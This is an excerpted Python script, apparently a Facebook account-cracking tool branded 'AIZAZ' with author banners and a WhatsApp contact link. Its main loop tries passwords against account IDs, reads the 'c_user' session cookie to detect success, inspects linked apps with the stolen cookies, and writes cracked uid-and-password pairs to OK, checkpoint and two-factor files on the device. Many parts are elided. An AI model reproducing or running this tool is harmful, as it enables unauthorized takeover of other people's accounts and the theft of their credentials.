...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; AZII \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
AZII2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
def Jawnx(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :azking = ' 2009'
        elif uid[:9] in ['100000000']       :azking = '~> 2009'
        elif uid[:8] in ['10000000']        :azking = '~> 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:azking = '~> 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:azking = ' 2010'
        elif uid[:6] in ['100001']          :azking = '~> 2010/2011'
        elif uid[:6] in ['100002','100003'] :azking = '~> 2011/2012'
        elif uid[:6] in ['100004']          :azking = '~> 2012/2013'
        elif uid[:6] in ['100005','100006'] :azking = '~> 2013/2014'
        elif uid[:6] in ['100007','100008'] :azking = '~> 2014/2015'
        elif uid[:6] in ['100009']          :azking = '~> 2015'
        elif uid[:5] in ['10001']           :azking = '~> 2015/2016'
        elif uid[:5] in ['10002']           :azking = '~> 2016/2017'
        elif uid[:5] in ['10003']           :azking = '~> 2018/2019'
        elif uid[:5] in ['10004']           :azking = '~> 2019/2020'
        elif uid[:5] in ['10005']           :azking = '~> 2020'
        elif uid[:5] in ['10006','10007','']:azking = '~> 2021'
        elif uid[:5] in ['10008']           :azking = '~> 2022'
        else:azking=''
...
\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36ⒽⒷⒻ\033[1;37m══════════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mAIZAZ KHAN           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mAIZAZ KHAN           \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mTOOL      \033[1;31m ➟  \033[1;32m PERSONAL                 \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mMZK AIZAZ                  \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m2.0                          \033[1;31m   │
...
print("")
print(f"{BLUE} PUT YOUR NAME LIKE ZAWAR, BILAL, AIZAZ, DILA ")
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) AZII
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {AZIIT()} {WHITE}]")
    ...
    if AZII in ["1","01"]:
        ...
        os.system("xdg-open https://wa.me/+923437487719")
        XYZ()
    elif AZII in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/AZII-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/AZII-CP.txt')
...
def freeq(uid,pwx,tl):
    ...
    'accept-language': 'en-US,en;q=0.9',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio AZII_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/AZII-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio AZII_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/AZII-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio AZII_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/AZII-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AZII 🔥] [%s] \33[1;97m[OK:%s{AZII2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
